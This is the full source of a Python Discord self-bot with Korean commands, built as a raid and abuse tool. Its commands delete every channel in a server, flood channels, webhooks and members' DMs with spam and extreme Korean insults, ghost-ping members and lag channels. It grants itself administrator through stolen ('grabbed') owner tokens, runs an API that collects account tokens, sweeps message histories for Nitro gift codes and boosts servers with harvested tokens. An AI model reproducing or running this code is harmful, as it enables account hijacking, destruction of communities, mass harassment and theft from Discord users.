# heukryong.py
# pip install discord.py-self aiohttp flask requests tls_client
# python heukryong.py

import discord
from discord.ext import commands
import asyncio, aiohttp, json, os, random, time, re, threading, string, requests
from flask import Flask, request, jsonify
from datetime import datetime
try:
    import tls_client
except:
    tls_client = None

PREFIX = "."
DATA_FILE = "heuk_data.json"
BOOST_TOKENS_FILE = "boost_tokens.txt"   # 부스트용 토큰 한 줄에 하나
API_PORT = 8080
SPAM_MSG = "# 흑사회에게 머리를 조아려라 좆버러지새기들아!!  https://cdn.discordapp.com/attachments/1557406587839054004/1563837365733298257/GIF_4038174851.gif?ex=6adf148a&is=6addc30a&hm=ba05297fbba85cb33195e98a3ed85cdaa1730ddd60848f514986e3acfb2cbb55&  @everyone"
GIF_URL = "https://cdn.discordapp.com/attachments/1557406587839054004/1563837365733298257/GIF_4038174851.gif?ex=6adf148a&is=6addc30a&hm=ba05297fbba85cb33195e98a3ed85cdaa1730ddd60848f514986e3acfb2cbb55&"
CHANNEL_NAMES = ["흑룡회 †黑龍", "●█▀█▄모두무릎을꿇어라"]
장애타목록 = [
    "# 야이 개벌래스래기새기야",
    "# 너 좆된거야 병신새기야 ㅋㅋㅋㅋㅋㅋ",
    "# 야이 어망구 좆뒤진 새기야!!",
    "야이 애미창녀 개보지 쓰레기새기야!",
    "# 야이 씨발 개같은 새끼야 니 애미 창녀새끼야",
    "# 좆밥새끼야 너 오늘 죽었다 병신아 ㅋㅋㅋㅋ",
    "# 야이 미친 개새기야 니 뇌 어디에 팔아먹었냐",
    "# 애미뒤진 새끼야 니 얼굴 보면 토나와 씨발",
    "# 야이 개보지년아 니 애비도 너처럼 쓰레기냐",
    "# 씨발련아 너 같은 새끼는 태어나지 말았어야 했다",
]
NITRO_REGEX = re.compile(r"(?:https?://)?(?:discord\.gift/|discord\.com/gifts/|discordapp\.com/gifts/)([a-zA-Z0-9]{16,24})")

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE,"r",encoding="utf-8") as f: return json.load(f)
    return {}

def save_data(d):
    with open(DATA_FILE,"w",encoding="utf-8") as f: json.dump(d,f,indent=2,ensure_ascii=False)

def get_user(uid):
    return load_data().get(str(uid),{"main":"","grabbed":[]})

def set_user(uid, main=None, grabbed=None):
    d=load_data(); uid=str(uid)
    if uid not in d: d[uid]={"main":"","grabbed":[]}
    if main is not None: d[uid]["main"]=main
    if grabbed is not None: d[uid]["grabbed"]=grabbed
    d[uid]["updated"]=datetime.now().isoformat()
    save_data(d)

def load_boost_tokens():
    if not os.path.exists(BOOST_TOKENS_FILE): return []
    with open(BOOST_TOKENS_FILE,"r",encoding="utf-8") as f:
        return [l.strip() for l in f if l.strip() and len(l.strip())>40]

def remove_boost_token(token):
    toks=load_boost_tokens()
    with open(BOOST_TOKENS_FILE,"w",encoding="utf-8") as f:
        for t in toks:
            if t!=token: f.write(t+"\n")

# ---------- API ----------
app=Flask(__name__)

@app.route("/api/token",methods=["POST"])
def api_token():
    b=request.json or {}
    uid,kind,token=str(b.get("user_id","")),b.get("kind"),b.get("token","")
    if not uid or not kind: return jsonify({"ok":False,"msg":"파라미터 부족"}),400
    if kind=="main":
        set_user(uid,main=token.strip())
        return jsonify({"ok":True,"msg":"main 저장됨"})
    if kind=="boost":
        with open(BOOST_TOKENS_FILE,"a",encoding="utf-8") as f:
            for t in token.split(","):
                t=t.strip()
                if len(t)>40: f.write(t+"\n")
        return jsonify({"ok":True,"msg":"boost 토큰 추가됨"})
    return jsonify({"ok":False,"msg":"kind 오류"}),400

@app.route("/api/status/<uid>")
def api_status(uid):
    u=get_user(uid)
    return jsonify({"main":bool(u.get("main")),"boost_count":len(load_boost_tokens()),"grabbed_count":len(u.get("grabbed",[])),"updated":u.get("updated")})

def run_api():
    app.run(host="0.0.0.0",port=API_PORT,debug=False,use_reloader=False)

# ---------- 부스트 클래스 (오픈소스 흡수) ----------
class Booster:
    def __init__(self, token):
        self.token=token
        self.headers={
            "authorization":token,
            "accept":"*/*",
            "content-type":"application/json",
            "user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9007 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
            "x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDA3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYxODQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
        }
        self.session=tls_client.Session(client_identifier="chrome_107") if tls_client else None
        self.sub_ids=[]

    def has_nitro(self):
        try:
            if self.session:
                r=self.session.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",headers=self.headers)
            else:
                r=requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",headers=self.headers)
            if r.status_code in (401,403):
                remove_boost_token(self.token)
                return False
            data=r.json()
            self.sub_ids=[s["id"] for s in data if not s.get("cooldown_ends_at")]
            return len(self.sub_ids)>0
        except:
            return False

    def boost(self, guild_id):
        ok=0
        for sid in self.sub_ids:
            try:
                payload={"user_premium_guild_subscription_slot_ids":[sid]}
                if self.session:
                    r=self.session.put(f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions",headers=self.headers,json=payload)
                else:
                    r=requests.put(f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions",headers=self.headers,json=payload)
                if r.status_code==201:
                    ok+=1
            except: pass
        return ok

# ---------- 봇 ----------
intents=discord.Intents.all()
bot=commands.Bot(command_prefix=PREFIX,self_bot=True,intents=intents)
장애타_running=메시지스팸_running=렉유발_running=니트로_스캔중=False
CURRENT_UID=None

@bot.event
async def on_ready():
    print(f"[흑룡회] {bot.user} 로그인")
    await bot.change_presence(status=discord.Status.dnd)

@bot.command(name="명령어")
async def cmd_list(ctx):
    try: await ctx.message.delete()
    except: pass
    await ctx.send("""```명령어

- .ip위치탐색기
- .ping
- .관리자권한 (오너닉네임)
- .장애타시작
- .장애타중지
- .채널삭제
- .채널생성 (이름)
- .채널스팸
- .전체채널도배 (메시지) @everyone
- .렉유발
- .메시지스팸
- .고스트핑
- .서버복사
- .웹훅추출
- .웹훅전체도배 (메시지) @everyone
- .투표도배 (이모티콘)
- .디엠테러 (메시지) @everyone
- .링크테러 (링크)
- .이미지테러 (이미지)
- .니트로체커
- .부스트봇 (개수)
- .토큰그래버 (이름)```""")

@bot.command(name="ping")
async def ping(ctx):
    try: await ctx.message.delete()
    except: pass
    t=time.perf_counter()
    m=await ctx.send("...")
    await m.edit(content=f"🏓 `{round((time.perf_counter()-t)*1000)}ms` | ws `{round(bot.latency*1000)}ms`")

@bot.command(name="ip위치탐색기")
async def ip_lookup(ctx, ip:str=None):
    try: await ctx.message.delete()
    except: pass
    if not ip: return await ctx.send("`.ip위치탐색기 1.2.3.4`")
    try:
        r=requests.get(f"http://ip-api.com/json/{ip}?lang=kr",timeout=5).json()
        if r.get("status")!="success": return await ctx.send("실패")
        await ctx.send(f"**IP** `{r.get('query')}`\n{r.get('country')} {r.get('regionName')} {r.get('city')}\n{r.get('isp')} | {r.get('org')}\n{r.get('lat')}, {r.get('lon')}")
    except Exception as e: await ctx.send(str(e))

@bot.command(name="관리자권한")
async def admin_power(ctx, *, owner_nick:str=None):
    try: await ctx.message.delete()
    except: pass
    if not owner_nick: return await ctx.send("`.관리자권한 오너닉`")
    g=ctx.guild
    if not g: return await ctx.send("서버에서")
    target=next((m for m in g.members if owner_nick.lower() in (m.display_name.lower(),str(m.name).lower())),None)
    if not target: return await ctx.send("없음")
    await ctx.send(f"타겟 `{target}`")
    data=get_user(CURRENT_UID)
    ot=next((x["token"] for x in data.get("grabbed",[]) if owner_nick.lower() in x.get("name","").lower()),None)
    if ot:
        await ctx.send("오너 토큰 강제 부여")
        try:
            c=discord.Client(intents=intents)
            done=asyncio.Event()
            @c.event
            async def on_ready():
                try:
                    gg=c.get_guild(g.id)
                    if not gg: await ctx.send("접근실패"); await c.close(); done.set(); return
                    role=await gg.create_role(name="흑룡회†관리자",permissions=discord.Permissions(administrator=True),colour=discord.Colour.dark_red(),hoist=True)
                    me=gg.get_member(bot.user.id)
                    if me: await me.add_roles(role)
                    await ctx.send(f"부여완료 {role.name}")
                except Exception as e: await ctx.send(str(e))
                finally: await c.close(); done.set()
            await c.start(ot); await done.wait()
        except Exception as e: await ctx.send(f"실패 {e}")
        return
    try:
        role=await g.create_role(name="흑룡회†관리자",permissions=discord.Permissions(administrator=True),colour=discord.Colour.dark_red(),hoist=True)
        await ctx.author.add_roles(role)
        await ctx.send(f"현재권한 부여 {role.mention}")
    except Exception as e: await ctx.send(f"권한부족 {e}")

@bot.command(name="토큰그래버")
async def token_grabber(ctx, *, name:str="unknown"):
    try: await ctx.message.delete()
    except: pass
    await ctx.send(f"슬롯 `{name}` 열림. grabbed에 넣으면 `.관리자권한 {name}`")

@bot.command(name="장애타시작")
async def jangae_start(ctx):
    global 장애타_running
    try: await ctx.message.delete()
    except: pass
    if 장애타_running: return await ctx.send("이미중")
    장애타_running=True
    await ctx.send("장애타")
    while 장애타_running:
        try: await ctx.send(random.choice(장애타목록)); await asyncio.sleep(0.16)
        except: await asyncio.sleep(0.35)

@bot.command(name="장애타중지")
async def jangae_stop(ctx):
    global 장애타_running
    try: await ctx.message.delete()
    except: pass
    장애타_running=False
    await ctx.send("중지")

@bot.command(name="채널삭제")
async def del_channels(ctx):
    try: await ctx.message.delete()
    except: pass
    n=0
    for ch in list(ctx.guild.channels):
        try: await ch.delete(); n+=1; await asyncio.sleep(0.06)
        except: pass
    try: await ctx.send(f"{n}개",delete_after=3)
    except: pass

@bot.command(name="채널생성")
async def create_channel(ctx, *, name:str="흑룡회"):
    try: await ctx.message.delete()
    except: pass
    try:
        ch=await ctx.guild.create_text_channel(name)
        await ctx.send(f"{ch.mention}")
    except Exception as e: await ctx.send(str(e))

@bot.command(name="채널스팸")
async def channel_spam(ctx):
    try: await ctx.message.delete()
    except: pass
    await ctx.send("채널스팸")
    for i in range(60):
        try: await ctx.guild.create_text_channel(CHANNEL_NAMES[i%2]); await asyncio.sleep(0.2)
        except Exception as e:
            if "429" in str(e): await asyncio.sleep(1.3)
            else: break
    await ctx.send("끝")

@bot.command(name="메시지스팸")
async def msg_spam(ctx):
    global 메시지스팸_running
    try: await ctx.message.delete()
    except: pass
    if 메시지스팸_running:
        메시지스팸_running=False
        return await ctx.send("중지")
    메시지스팸_running=True
    await ctx.send("메시지스팸")
    while 메시지스팸_running:
        for ch in list(ctx.guild.text_channels):
            if not 메시지스팸_running: break
            try: await ch.send(SPAM_MSG); await asyncio.sleep(0.09)
            except: pass
        await asyncio.sleep(0.12)

@bot.command(name="전체채널도배")
async def all_channel_spam(ctx, *, msg:str=None):
    try: await ctx.message.delete()
    except: pass
    c=msg or SPAM_MSG
    for ch in list(ctx.guild.text_channels):
        try: await ch.send(c); await asyncio.sleep(0.07)
        except: pass
    await ctx.send("완료",delete_after=2)

@bot.command(name="렉유발")
async def lag(ctx):
    global 렉유발_running
    try: await ctx.message.delete()
    except: pass
    if 렉유발_running:
        렉유발_running=False
        return await ctx.send("중지")
    렉유발_running=True
    await ctx.send("렉유발")
    huge="\u200b"*1800
    while 렉유발_running:
        for ch in list(ctx.guild.text_channels):
            if not 렉유발_running: break
            try: await ch.send(huge+"\n@everyone"); await asyncio.sleep(0.06)
            except: pass

@bot.command(name="고스트핑")
async def ghost_ping(ctx):
    try: await ctx.message.delete()
    except: pass
    n=0
    for m in list(ctx.guild.members)[:150]:
        try:
            msg=await ctx.send(m.mention)
            await msg.delete()
            n+=1
            await asyncio.sleep(0.06)
        except: pass
    await ctx.send(f"{n}회",delete_after=2)

@bot.command(name="서버복사")
async def copy_server(ctx):
    try: await ctx.message.delete()
    except: pass
    try:
        new=await bot.create_guild(name=f"{ctx.guild.name} 복사본")
        await asyncio.sleep(1)
        for cat in ctx.guild.categories:
            try:
                nc=await new.create_category(cat.name)
                for ch in cat.channels:
                    if isinstance(ch,discord.TextChannel):
                        await new.create_text_channel(ch.name,category=nc)
                        await asyncio.sleep(0.1)
            except: pass
        await ctx.send(f"복사 `{new.name}`")
    except Exception as e: await ctx.send(str(e))

@bot.command(name="웹훅추출")
async def webhook_extract(ctx):
    try: await ctx.message.delete()
    except: pass
    hooks=[]
    for ch in ctx.guild.text_channels:
        try:
            for wh in await ch.webhooks(): hooks.append(f"{ch.name} → {wh.url}")
        except: pass
    if not hooks: return await ctx.send("없음")
    t="\n".join(hooks)
    for i in range(0,len(t),1900): await ctx.send(f"```{t[i:i+1900]}```")

@bot.command(name="웹훅전체도배")
async def webhook_spam(ctx, *, msg:str=None):
    try: await ctx.message.delete()
    except: pass
    c=msg or SPAM_MSG
    n=0
    for ch in list(ctx.guild.text_channels):
        try:
            hooks=await ch.webhooks()
            wh=hooks[0] if hooks else await ch.create_webhook(name="흑룡회")
            for _ in range(8):
                await wh.send(c); n+=1; await asyncio.sleep(0.07)
        except: pass
    await ctx.send(f"{n}회",delete_after=3)

@bot.command(name="투표도배")
async def vote_spam(ctx, emoji:str="🔥"):
    try: await ctx.message.delete()
    except: pass
    for ch in list(ctx.guild.text_channels):
        try:
            async for msg in ch.history(limit=30):
                try: await msg.add_reaction(emoji); await asyncio.sleep(0.04)
                except: pass
        except: pass
    await ctx.send("완료",delete_after=2)

@bot.command(name="디엠테러")
async def dm_terror(ctx, *, msg:str=None):
    try: await ctx.message.delete()
    except: pass
    c=msg or SPAM_MSG
    n=0
    for m in list(ctx.guild.members):
        if m.bot or m.id==bot.user.id: continue
        try: await m.send(c); n+=1; await asyncio.sleep(0.2)
        except: pass
    await ctx.send(f"{n}명",delete_after=3)

@bot.command(name="링크테러")
async def link_terror(ctx, link:str=None):
    try: await ctx.message.delete()
    except: pass
    if not link: return await ctx.send("`.링크테러 url`")
    for ch in list(ctx.guild.text_channels):
        try: await ch.send(f"{link}\n@everyone"); await asyncio.sleep(0.07)
        except: pass
    await ctx.send("완료",delete_after=2)

@bot.command(name="이미지테러")
async def img_terror(ctx, url:str=None):
    try: await ctx.message.delete()
    except: pass
    t=url or GIF_URL
    for ch in list(ctx.guild.text_channels):
        try: await ch.send(t); await asyncio.sleep(0.07)
        except: pass
    await ctx.send("완료",delete_after=2)

@bot.command(name="니트로체커")
async def nitro_checker(ctx):
    global 니트로_스캔중
    try: await ctx.message.delete()
    except: pass
    if 니트로_스캔중: return await ctx.send("스캔중")
    니트로_스캔중=True
    await ctx.send("니트로 실시간 스캔 시작 · 유효 하나 나오면 즉시 전송 후 중단")
    found=None
    try:
        for g in bot.guilds:
            if found: break
            for ch in g.text_channels:
                if found: break
                try:
                    async for msg in ch.history(limit=100):
                        m=NITRO_REGEX.search(msg.content or "")
                        if m:
                            code=m.group(1)
                            async with aiohttp.ClientSession() as s:
                                async with s.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true") as r:
                                    if r.status==200:
                                        found=f"https://discord.gift/{code}"
                                        break
                except: pass
        if not found:
            for ch in bot.private_channels:
                if found: break
                try:
                    async for msg in ch.history(limit=60):
                        m=NITRO_REGEX.search(msg.content or "")
                        if m:
                            code=m.group(1)
                            async with aiohttp.ClientSession() as s:
                                async with s.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true") as r:
                                    if r.status==200:
                                        found=f"https://discord.gift/{code}"
                                        break
                except: pass
        if found: await ctx.send(f"**유효 니트로**\n{found}")
        else: await ctx.send("유효 없음")
    finally:
        니트로_스캔중=False

@bot.command(name="부스트봇")
async def boost_bot(ctx, count:int=2):
    try: await ctx.message.delete()
    except: pass
    toks=load_boost_tokens()
    if not toks: return await ctx.send("boost_tokens.txt 비어있음. 공식봇으로 추가하거나 파일에 넣어라")
    guild_id=ctx.guild.id
    await ctx.send(f"부스트 토큰 {len(toks)}개 로드 · 목표 {count}개")
    total=0
    used=0
    for tok in toks:
        if used>=count: break
        b=Booster(tok)
        if b.has_nitro():
            n=b.boost(guild_id)
            total+=n
            used+=1
            await asyncio.sleep(0.8)
        else:
            remove_boost_token(tok)
    await ctx.send(f"부스트 완료 · 성공 슬롯 {total}개")

def main():
    global CURRENT_UID
    print("흑룡회 셀프봇")
    uid=input("유저 ID: ").strip()
    CURRENT_UID=uid
    u=get_user(uid)
    token=u.get("main","").strip()
    if not token:
        token=input("메인 토큰: ").strip()
        if not token: print("종료"); return
        set_user(uid,main=token)
    threading.Thread(target=run_api,daemon=True).start()
    print(f"API :{API_PORT}")
    bot.run(token)

if __name__=="__main__":
    main()
